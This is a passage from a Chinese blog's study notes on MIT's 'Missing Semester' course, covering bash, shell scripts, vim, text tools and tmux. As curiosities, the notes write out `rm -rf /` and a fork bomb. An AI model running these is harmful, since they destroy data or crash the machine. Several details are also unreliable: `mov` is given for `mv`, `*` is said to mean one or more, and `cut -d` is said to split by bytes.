<li><a href="https://unauth401.tech/pcb2023/#baby-heap">鹏城杯 2023 初赛 Pwn WriteUp</a></li>
<li><a href="https://mp.weixin.qq.com/s/tjz3urSdsQac30JiqVN62Q">2023第三届“鹏城杯”线上初赛WriteUp</a></li>
<li><a href="https://www.cnblogs.com/ZIKH26/articles/16066329.html">DASCTF2022_checkin - ZikH26</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机教育缺失的一课</title>
    <url>/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/</url>
    <content><![CDATA[<blockquote>
<p>the Missing Semester of your CS education</p>
</blockquote>
<span id="more"></span>

<p>The Missing Semester of your CS education，共<code>11</code>节课，每节课约1h。</p>
<ul>
<li><a href="https://www.bilibili.com/video/BV1uc411N7eK/?spm_id_from=333.999.0.0&vd_source=ccaa27461534d3a4a5e9b964672f86d6">bilibili 双语字幕</a></li>
<li><a href="https://www.youtube.com/playlist?list=PLyzOVJj3bHQuloKGG59rS43e29ro7I57J">Missing Semester IAP 2020</a></li>
</ul>
<p>确实不错，手敲命令+讲解。多使用Linux</p>
<p>学校应该在大一教这个，而不是TM的大学物理</p>
<p>课程网站</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://missing.csail.mit.edu/</span><br></pre></td></tr></table></figure>

<h2 id="lectrue1-overview-shell"><a href="#lectrue1-overview-shell" class="headerlink" title="lectrue1: overview &amp; shell"></a>lectrue1: overview &amp; shell</h2><blockquote>
<p>主要是 Linux 基本命令</p>
</blockquote>
<h3 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h3><ul>
<li>如何利用存在的工具使我们开发更加高效，以及如何更好的利用我们的计算机，这是这门课主要解决的问题。</li>
</ul>
<h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><p>讲述了Linux Shell.主要是bash</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">shell是运行在终端中的文本互动程序，bash（GNU Bourne-Again Shell）是最常用的一种shell。是当前大多数Linux发行版的默认Shell。</span><br></pre></td></tr></table></figure>

<p>日期</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">date</span></span><br></pre></td></tr></table></figure>

<p>打印</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure>

<p>路径列表</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 当我们执行一些命令时，会遍历PATH寻找；比如说使用 /bin/echo 时只需在终端输入 echo 就行</span></span><br><span class="line"><span class="comment"># `:` 分隔</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<p>寻找命令的路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">which</span> <span class="built_in">echo</span></span><br><span class="line">/usr/bin/echo</span><br><span class="line"></span><br><span class="line"><span class="comment"># whereis可以寻找到 原始代码、二进制文件，或是帮助文件</span></span><br><span class="line">$ whereis bash</span><br><span class="line">bash: /usr/bin/bash /usr/share/man/man1/bash.1.gz</span><br></pre></td></tr></table></figure>

<p>目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># change dir</span></span><br><span class="line">$ <span class="built_in">cd</span> /home/username</span><br><span class="line"></span><br><span class="line"><span class="comment"># `..` 代表上一级目录。`.` 代表当前目录 </span></span><br><span class="line">$ <span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># `-`  当前目录和之前目录下切换</span></span><br><span class="line">$ <span class="built_in">cd</span> /mnt</span><br><span class="line">$ <span class="built_in">cd</span> /home</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/mnt</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/home</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/mnt</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有趣的一点是，`..`使用过多的情况。`/`目录没有上一级，最高只能到 `/`</span></span><br><span class="line">$ ../../../../../../bin/date</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure>

<p>文件操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  list: 列出指定目录下所有的文件，默认当前目录</span></span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">test.txt</span><br><span class="line">$ <span class="built_in">ls</span> /</span><br><span class="line">lib root home ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移动文件位置 move</span></span><br><span class="line">$ mov test.txt /tmp</span><br><span class="line">$ <span class="built_in">ls</span> /tmp</span><br><span class="line">test.txt</span><br><span class="line"><span class="comment"># 重命名</span></span><br><span class="line">$ <span class="built_in">cd</span> /tmp</span><br><span class="line">$ mov test.txt tmp.txt</span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">tmp.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制 copy</span></span><br><span class="line">$ <span class="built_in">cp</span> tmp.txt tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line">$ <span class="built_in">rm</span> tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个文件</span></span><br><span class="line">$ <span class="built_in">touch</span> tmp2.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line">$ <span class="built_in">mkdir</span> tmpdir</span><br><span class="line">$ <span class="built_in">rmdir</span> <span class="comment"># rm -r 也行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件所有内容</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt</span><br><span class="line">hello world</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件开头结尾，默认10行</span></span><br><span class="line">$ <span class="built_in">head</span> test.txt</span><br><span class="line">$ <span class="built_in">tail</span> test.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat 重定向</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt &gt; tmp.txt   <span class="comment"># 如果没有就创建tmp.txt.</span></span><br><span class="line">$ <span class="built_in">cat</span> &lt; text.txt &gt; tmp.txt <span class="comment"># 同上</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt &gt;&gt; tmp.txt  <span class="comment"># &gt; 会清除原先内容。&gt;&gt; 代表append，追加而不清除</span></span><br></pre></td></tr></table></figure>

<p>命令参数和帮助文档</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一般命令也存在参数，一般为 -?</span></span><br><span class="line">$ <span class="built_in">ls</span> -l  /home</span><br><span class="line"><span class="comment"># d: dir rwx: 权限Read, Write, eXecute(也代表是否能够访问此目录)。</span></span><br><span class="line"><span class="comment"># 从前到后: owner权限 group权限 其余用户权限 owner group size date dir_name</span></span><br><span class="line">drwxr-x--- 27 user user 4096 Jun 21 14:42 user  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查帮助文档，q退出。manual pages</span></span><br><span class="line">$ man <span class="built_in">ls</span> </span><br><span class="line"> -l     use a long listing format</span><br></pre></td></tr></table></figure>

<p>管道：左侧的输出作为右侧的输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> / | <span class="built_in">tail</span> -n 1 <span class="comment"># -n 1 最后一行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有时候给root权限文件写入时，比如sudo echo 123 &gt; tmp.txt会报错，可用以下命令</span></span><br><span class="line">$ <span class="built_in">echo</span> 123 | sudo <span class="built_in">tee</span> tmp.txt</span><br></pre></td></tr></table></figure>

<p>root user: 超级管理员。尽量少用，在运行错误的程序时会破坏计算机。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用户使用root权限</span></span><br><span class="line">$ sudo &lt;commond&gt;</span><br><span class="line"></span><br><span class="line">$ sudo su</span><br><span class="line">password: xxx</span><br><span class="line">root<span class="comment"># `#` 代表root 权限 </span></span><br></pre></td></tr></table></figure>

<p><code>/sys</code> 文件夹：各种内核参数，显示设备的状态。linux系统将其视为文件暴漏给用户，意味着我们可以操作从而控制某些设备</p>
<p>有趣的命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删库跑路，无需确认强制删除所有的文件</span></span><br><span class="line">$ <span class="built_in">rm</span> -rf /</span><br><span class="line"></span><br><span class="line"><span class="comment"># fork 炸弹, 会耗尽电脑资源</span></span><br><span class="line">$ :()&#123; :|:&amp; &#125;;:  <span class="comment"># 理解为一个函数递归调用 `:` 为函数名</span></span><br><span class="line">:() &#123;</span><br><span class="line">	: | :&amp;</span><br><span class="line">&#125;;</span><br><span class="line">:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于ls打错频率比较高，会出现一个动画(火车)</span></span><br><span class="line">sl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># cowsay 打印一段话 cowthink 类似，但是think</span></span><br><span class="line">cowsay <span class="string">&quot;nb&quot;</span></span><br><span class="line">	-l 查看动物，需要安装</span><br><span class="line">	-f 指定动物</span><br><span class="line"> ____</span><br><span class="line">&lt; nb &gt;</span><br><span class="line"> ----</span><br><span class="line">        \   ^__^</span><br><span class="line">         \  (oo)\_______</span><br><span class="line">            (__)\       )\/\</span><br><span class="line">                ||----w |</span><br><span class="line">                ||     ||</span><br><span class="line"></span><br><span class="line"><span class="comment"># figlet 字符字  toilet类似 </span></span><br><span class="line">figlet love</span><br><span class="line"> <span class="string">&quot;&quot;</span><span class="comment">#</span></span><br><span class="line">   <span class="comment">#     mmm   m   m   mmm</span></span><br><span class="line">   <span class="comment">#    #&quot; &quot;#  &quot;m m&quot;  #&quot;  #</span></span><br><span class="line">   <span class="comment">#    #   #   #m#   #&quot;&quot;&quot;&quot;</span></span><br><span class="line">   <span class="string">&quot;mm  &quot;</span><span class="comment">#m#&quot;    #    &quot;#mm&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印一堆信息和logo，装b使用</span></span><br><span class="line">neofetch</span><br></pre></td></tr></table></figure>

<p>现代化的命令：开发者使用rust写了很多更加现代的命令，可以替代一些老命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exa  =&gt;  <span class="built_in">ls</span></span><br><span class="line">bat  =&gt;  <span class="built_in">cat</span> </span><br></pre></td></tr></table></figure>

<h4 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h4><p>shell, console, terminal?</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">xxx</span><br></pre></td></tr></table></figure>

<h2 id="lectrue2-shell-script"><a href="#lectrue2-shell-script" class="headerlink" title="lectrue2: shell script"></a>lectrue2: shell script</h2><blockquote>
<p>Linux 脚本的使用</p>
</blockquote>
<p>语法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$0</span>      运行文件名</span><br><span class="line"><span class="variable">$1</span>-<span class="variable">$9</span>   参数</span><br><span class="line">$?      获取上一个运行的错误 0代表正确，1代表出错</span><br><span class="line"><span class="variable">$_</span>      存储上次运行的结果</span><br><span class="line"><span class="variable">$#</span>      参数个数</span><br><span class="line">$$      进程<span class="built_in">id</span></span><br><span class="line"><span class="variable">$@</span>      所有的参数组成，可迭代</span><br><span class="line"></span><br><span class="line">!!      在执行时会替换为上一个执行的命令</span><br><span class="line"><span class="comment"># 变量</span></span><br><span class="line">foo=bar</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$foo</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量赋值为命令的结果</span></span><br><span class="line">foo=$(<span class="built_in">pwd</span>)</span><br></pre></td></tr></table></figure>

<p>循环</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> xxx; <span class="keyword">do</span>... <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>条件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> xxx; then...fi</span><br></pre></td></tr></table></figure>

<p>编程脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加入magic line 指定解析器</span></span><br><span class="line"><span class="comment"># 一个 称之为 `shebang` 的东西</span></span><br><span class="line"><span class="comment">#!/usr/bin/pyton3</span></span><br></pre></td></tr></table></figure>

<p><code>man</code> 命令的其余选择 <code>tldr</code> ，更加简洁(too long; don’t read)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tldr tar</span><br></pre></td></tr></table></figure>

<p>递归查询</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find .     <span class="comment"># . 代表当前路径，我们可以指定比如 `/` </span></span><br><span class="line">	-name  <span class="comment"># 名称,可以使用通配符</span></span><br><span class="line">	-<span class="built_in">type</span>  <span class="comment"># 类型 d(dir) f(file)</span></span><br><span class="line">	-mtime -1 <span class="comment"># 修改时间modify time， 1指1天</span></span><br><span class="line">	-<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \;   <span class="comment"># 对于寻找的文件执行命令 \; 不可缺少</span></span><br><span class="line"></span><br><span class="line">fd  <span class="comment"># 更加现代化的find</span></span><br><span class="line"></span><br><span class="line">locate  <span class="comment"># 默认查找整个计算机</span></span><br><span class="line"></span><br><span class="line">grep  <span class="comment"># 应用于查文件内容</span></span><br><span class="line">	-R  <span class="comment">#  递归</span></span><br><span class="line"></span><br><span class="line">rg  <span class="comment"># ripgrep</span></span><br></pre></td></tr></table></figure>


<p>查找使用过的命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">方向键的上</span><br><span class="line"></span><br><span class="line">fzf</span><br><span class="line"></span><br><span class="line">zsh 的一个插件，在输入时会显示曾经输入的类似命令</span><br></pre></td></tr></table></figure>


<p>更清晰的目录结构</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tree</span><br><span class="line">broot</span><br></pre></td></tr></table></figure>

<h2 id="lecture3-editor-VIM"><a href="#lecture3-editor-VIM" class="headerlink" title="lecture3: editor VIM"></a>lecture3: editor VIM</h2><p>vim</p>
<ul>
<li>normal mode: 可以控制光标，执行命令…</li>
<li>insert mode: 就是文本编辑器。</li>
<li>command mode: 在insert mode 输入 <code>:</code> 在输入命令</li>
<li>visual mode: 有点像使用鼠标选中一块连续区域</li>
<li>replace mode</li>
</ul>
<p>进入 insert mode</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">i   <span class="keyword">insert</span>， 在光标前插入</span><br><span class="line"><span class="keyword">a</span>   <span class="keyword">append</span>，在光标后</span><br><span class="line">I   行首</span><br><span class="line">A   行尾</span><br><span class="line"><span class="keyword">o</span>   下一行 <span class="keyword">open</span> <span class="keyword">a</span> <span class="keyword">new</span> <span class="built_in">line</span></span><br><span class="line">O   上一行</span><br></pre></td></tr></table></figure>

<p>normal mode</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">esc  也可以自行配置</span><br></pre></td></tr></table></figure>

<p>保存，退出</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">-- <span class="keyword">write</span> <span class="keyword">quit</span></span><br><span class="line"><span class="keyword">normal</span> <span class="keyword">mode</span> 下 :<span class="keyword">wq</span></span><br><span class="line"></span><br><span class="line">-- 加入 ! 代表强制执行</span><br></pre></td></tr></table></figure>

<p>normal mode 光标操作。</p>
<ul>
<li>所有的都可以在<code>前面加一个数字</code>，代表count</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">h   左移</span><br><span class="line"><span class="keyword">j</span>   下</span><br><span class="line"><span class="keyword">k</span>   上</span><br><span class="line"><span class="keyword">l</span>   右</span><br><span class="line"></span><br><span class="line"><span class="keyword">w</span>   向前(后一个单词)移动一个 word, 也就是一个单词，标点或者空格分开。在单词第一个字母</span><br><span class="line"><span class="keyword">b</span>   向back移动 word      back of word</span><br><span class="line"><span class="keyword">e</span>   移动到单词末尾        end of word</span><br><span class="line"><span class="number">0</span>   移动到行首</span><br><span class="line">$   行尾</span><br><span class="line">^   一行第一个非空字符</span><br><span class="line"></span><br><span class="line">ctrl-<span class="keyword">u</span>     <span class="keyword">up</span>类似鼠标向上滚动</span><br><span class="line">ctrl-d     down 向下</span><br><span class="line"></span><br><span class="line">H  highest  屏幕第一行</span><br><span class="line">L  low      屏幕最后一行</span><br><span class="line">M  mid      屏幕中间一行</span><br></pre></td></tr></table></figure>

<p>删除</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">d  删除一个字符,配合移动光标使用</span><br><span class="line">	dd 删除一行，可以使用<span class="keyword">p</span></span><br><span class="line">	D 删除至末尾</span><br><span class="line">	d1G 删除到第一行</span><br><span class="line">	dG  删除到最后一行</span><br><span class="line">	n1, n2d 删除n1-n2行</span><br><span class="line">	-- 在这里 <span class="keyword">a</span> around;  i inside</span><br><span class="line">	<span class="keyword">di</span>(  删除括号内的内容</span><br><span class="line">	da(  删除包括括号的东西</span><br><span class="line"><span class="keyword">c</span>   <span class="keyword">change</span> <span class="keyword">a</span> word 删除(d 类似)并进入<span class="keyword">insert</span> <span class="keyword">mode</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">x</span>   删除后面一个字符</span><br><span class="line">	<span class="symbol">&lt;num&gt;</span><span class="keyword">x</span> 删除后面num个字符</span><br><span class="line">s   删除字符进入<span class="keyword">insert</span> <span class="keyword">mode</span></span><br><span class="line">S   删除一行进入<span class="keyword">insert</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure>

<p>复制粘贴</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">y</span>   <span class="keyword">yank</span> </span><br><span class="line">	yy 复制当前行</span><br><span class="line">	y1G ...</span><br><span class="line"><span class="keyword">p</span>   paste在这一行后面</span><br><span class="line"><span class="keyword">P</span>   这一行前面</span><br></pre></td></tr></table></figure>

<p>跳转到某一行</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">g</span><br><span class="line">	gg 第一行</span><br><span class="line">G   最后一行</span><br><span class="line">	<span class="symbol">&lt;num&gt;</span>G  跳转到num行</span><br><span class="line">:<span class="symbol">&lt;num&gt;</span>   跳到第num行</span><br></pre></td></tr></table></figure>

<p>撤销之前的操作</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">u</span> <span class="keyword">undo</span></span><br><span class="line">ctrl + r   <span class="keyword">redo</span> 恢复撤销的内容</span><br></pre></td></tr></table></figure>

<p>visual mode: 允许我们改变一列，整块复制等</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">v   字符可视，开始和结束两个字符中间所有内容，退出按v</span><br><span class="line">V   行可视行，光标所在行，退出 V</span><br><span class="line">ctrl+v   块可视，开始和结束光标的矩阵，退出ctrl+v</span><br></pre></td></tr></table></figure>

<p>搜索</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">f</span><span class="symbol">&lt;word&gt;</span>  本行查找</span><br><span class="line">/<span class="symbol">&lt;word&gt;</span>  查内容,全文</span><br><span class="line">n      继续向下继续找 <span class="keyword">next</span></span><br><span class="line"><span class="keyword">N</span>      继续向上找</span><br></pre></td></tr></table></figure>

<p>更改环境</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:<span class="keyword">set</span> <span class="keyword">nu</span>   显示行号</span><br></pre></td></tr></table></figure>

<p><code>~</code> 反转大小写</p>
<p>括号匹配</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">%   到匹配的另一个括号处</span><br></pre></td></tr></table></figure>

<p>tab, window, buffer</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">tab: 我理解为 在系统中打开vim这个软件两次，就是两个tab</span><br><span class="line"></span><br><span class="line">window: vim 屏幕，可以分屏</span><br><span class="line"></span><br><span class="line">buffer: 打开文件，文件具有buffer, 同一个文件同一个buffer,实时。</span><br></pre></td></tr></table></figure>

<p>配置，vim 在执行前会加载一个 <code>~/.vimrc</code> 文件。</p>
<ul>
<li>我们可以DIY自己的喜欢的按键。</li>
<li>安装插件实现更多的功能</li>
</ul>
<h3 id="neovim"><a href="#neovim" class="headerlink" title="neovim"></a>neovim</h3><p><del>本人使用</del>(IDE不香吗？) <a href="https://neovim.io/">neovim</a> 配合 <a href="https://www.lazyvim.org/">LazyVim</a>。可DIY. 然后再 <code>VsCode</code> 安装neovim插件，同步使用。</p>
<ul>
<li>vim常用的操作，neovim也能用。</li>
</ul>
<h4 id="keymap"><a href="#keymap" class="headerlink" title="keymap"></a>keymap</h4><p>Leader 为 space 键，挺好用, 使用这些功能也需要安装对应插件</p>
<p>打开终端</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>ft   当前</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fT   /</span><br><span class="line"></span><br><span class="line">ctrl-/    打开和关闭</span><br></pre></td></tr></table></figure>

<p>快速注释</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>gc    但是需要指定的 LSP</span><br></pre></td></tr></table></figure>

<p>不同文件间(buffer)切换</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>bb</span><br></pre></td></tr></table></figure>

<p>文件搜索 telescope</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">-- 文件名</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="symbol">&lt;leader&gt;</span>   <span class="symbol">&lt;esc&gt;</span><span class="symbol">&lt;esc&gt;</span> 退出</span><br><span class="line"></span><br><span class="line">-- 文件内容</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">sb</span></span><br></pre></td></tr></table></figure>

<p>文件内</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;c-s&gt;</span> 保存文件</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fn  <span class="keyword">new</span> <span class="keyword">file</span></span><br></pre></td></tr></table></figure>

<p>分屏</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">w</span>|  <span class="symbol">&lt;leader&gt;</span>|  生动表示竖着</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">w</span>-  <span class="symbol">&lt;leader&gt;</span>-  横着</span><br><span class="line"></span><br><span class="line">-- 切换，和<span class="keyword">normal</span> <span class="keyword">mode</span> 下的移动联系</span><br><span class="line"><span class="symbol">&lt;C-h&gt;</span> 左</span><br><span class="line"><span class="symbol">&lt;C-j&gt;</span> 下</span><br><span class="line"><span class="symbol">&lt;C-k&gt;</span> 上</span><br><span class="line"><span class="symbol">&lt;C-l&gt;</span> 右</span><br></pre></td></tr></table></figure>

<p>侧边栏 neo-tree</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>fe   当前</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fE   /</span><br><span class="line"></span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">e</span>   当前</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>E   /</span><br><span class="line"></span><br><span class="line">-- 侧边栏进入文件后，在进入侧边栏</span><br><span class="line"><span class="symbol">&lt;C-h&gt;</span> </span><br><span class="line"><span class="symbol">&lt;C-l&gt;</span> </span><br></pre></td></tr></table></figure>

<p>lazy.nvim 插件管理非常受欢迎。作者开发的插件和配置。</p>
<h2 id="lecture4-data-wrangling"><a href="#lecture4-data-wrangling" class="headerlink" title="lecture4: data wrangling"></a>lecture4: data wrangling</h2><blockquote>
<p>处理数据的某些手段</p>
</blockquote>
<p>grep，搜索</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;word&quot;</span> tmp.txt   <span class="comment"># 查询</span></span><br><span class="line">	-R  <span class="comment"># 递归，可以查找文件夹下的文件</span></span><br></pre></td></tr></table></figure>

<p>sed，在搜索替换是一个好用的工具。需要学习一下正则表达式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/&lt;pattern&gt;/&lt;replace&gt;/&#x27;</span></span><br><span class="line">pattern: 匹配模式，支持正则表达式</span><br><span class="line">replace: 将匹配到的pattern 转换为 replace。当捕获时 \num 代表第num个捕获，打印</span><br><span class="line"></span><br><span class="line"><span class="comment"># sed 默认支持很老的正则表达式，使用 `-E` 参数，支持现代化的正则</span></span><br></pre></td></tr></table></figure>

<p>一些正则表达式使用，使用在线网站练习。regular expression</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[0-9]   0,1,2...9 其中一个数字</span><br><span class="line">*       贪婪模式，1次或多次</span><br><span class="line">?       0 或 1 次</span><br><span class="line">.       任意字符</span><br><span class="line">()      捕获括号内的内容</span><br><span class="line">^ 开头   $ 末尾</span><br></pre></td></tr></table></figure>

<p>wc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">wc</span> -l    word count,统计大小 -l line 几行</span><br></pre></td></tr></table></figure>

<p>排序，字典序。去重</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span>    默认字典序排序</span><br><span class="line">	-n 按照数值的大小进行排序</span><br><span class="line">	-k 指定排序的列数</span><br><span class="line"><span class="built_in">uniq</span>    可去除重复内容</span><br><span class="line">	-c  记录出现次数</span><br></pre></td></tr></table></figure>

<p>awk，基于流的处理，是一门编程语言</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;script&#x27;</span>  执行一个脚本</span><br><span class="line">awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">	-F  指定分隔符</span><br></pre></td></tr></table></figure>

<p>cut，类似编程语言的split</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cut</span> [option] filename</span><br><span class="line">	-d   字节为单位分割  </span><br><span class="line">		<span class="built_in">cut</span> -d 3  第三个字符  -d 3-9,12  第3-9,12个字符</span><br><span class="line">	-f   fields 与-d一起使用，表示区域</span><br><span class="line">		<span class="built_in">cut</span> -d : -f2  第1-2个冒号之前的内容</span><br><span class="line">	-c   character 字符为单位，处理中文好用</span><br><span class="line">	-b   </span><br></pre></td></tr></table></figure>

<p>编程语言在命令行的使用? 各种管道，图片音频处理? </p>
<h2 id="lecture5-command-line-environment"><a href="#lecture5-command-line-environment" class="headerlink" title="lecture5: command-line environment"></a>lecture5: command-line environment</h2><blockquote>
<p>优雅的使用命令行</p>
</blockquote>
<h3 id="job-control"><a href="#job-control" class="headerlink" title="job control"></a>job control</h3><p>Linux 系统的 signal机制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">man signal : 会看到不同的number 和 name</span><br><span class="line"></span><br><span class="line">ctrl-c   SIGINT   signal interrupt</span><br><span class="line">ctrl-\   SIGQUIT</span><br></pre></td></tr></table></figure>

<p>ctrl+z</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 暂停，可执行其他任务</span></span><br><span class="line">&amp;     在命令后加入，表示后台执行</span><br><span class="line"><span class="built_in">jobs</span>  查看后台任务，暂停或者运行 pid</span><br><span class="line"><span class="built_in">fg</span> %num / <span class="built_in">bg</span> %num  使暂停的任务继续运行，<span class="built_in">fg</span> 恢复到前台。<span class="built_in">bg</span> 恢复到后台执行。front back ground</span><br><span class="line"><span class="built_in">kill</span> %num            停止</span><br></pre></td></tr></table></figure>

<h3 id="terminal-multiplexers"><a href="#terminal-multiplexers" class="headerlink" title="terminal multiplexers"></a>terminal multiplexers</h3><ul>
<li><p>终端复用，在一个terminal window干很多事情。</p>
</li>
<li><p>很多的终端都存在分屏等操作，但是课程介绍神器 <code>tmux</code>，更加神奇。</p>
<ul>
<li>不 kill session，其中的命令会一直执行下去。只需要开启一次终端。</li>
<li>在ssh 服务器时非常的好用</li>
</ul>
</li>
<li><p>session, window, pune</p>
<ul>
<li>启动tmux, 会开启一个session, 明显的是下面会出现一行数据。</li>
<li>window 创建一个新的shell 终端。</li>
<li>pune 面板，一个窗口可以分很多的面板。</li>
</ul>
</li>
</ul>
<p>命令行操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tmux</span><br><span class="line">	下部会出现状态栏，分别是session window1 windiow2...     时间等</span><br><span class="line"></span><br><span class="line">tmux a   <span class="comment"># attach 进入session</span></span><br><span class="line">		-t name  指定名称</span><br><span class="line"></span><br><span class="line">tmux new -t &lt;name&gt;       创建并指定名称</span><br><span class="line">tmux kill-session -t &lt;num/name&gt;  杀死指定的session</span><br><span class="line"></span><br><span class="line">tmux <span class="built_in">ls</span>   查看所有的session</span><br><span class="line"></span><br><span class="line">tmux splitw -h/-v   pane 横竖分割window</span><br></pre></td></tr></table></figure>

<p>默认快捷键。可以先按一下 <code>ctrl-b</code> 在按其余的，不需要同时按。</p>
